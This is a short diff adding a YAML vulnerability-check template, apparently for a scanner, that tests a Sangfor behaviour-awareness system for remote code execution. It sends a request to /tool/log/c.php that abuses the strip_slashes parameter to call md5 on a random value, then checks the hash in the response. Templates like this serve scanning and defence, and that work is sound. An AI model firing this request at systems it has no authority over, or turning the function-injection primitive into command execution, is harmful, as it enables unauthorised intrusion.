@@ -1,0 +1,17 @@
+id: sangfor-ba-rce
+
+info:
+    name: sangfor-ba-rce
+    author: Print1n(http://print1n.top)
+    severity: high
+    description: 行为感知系统
+
+set:
+    r1: randomLowercase(8)
+rules:
+    r0:
+        request:
+            method: GET
+            path: /tool/log/c.php?strip_slashes=md5&host={{r1}}
+        expression: response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(bytes(md5(r1)))
+expression: r0()
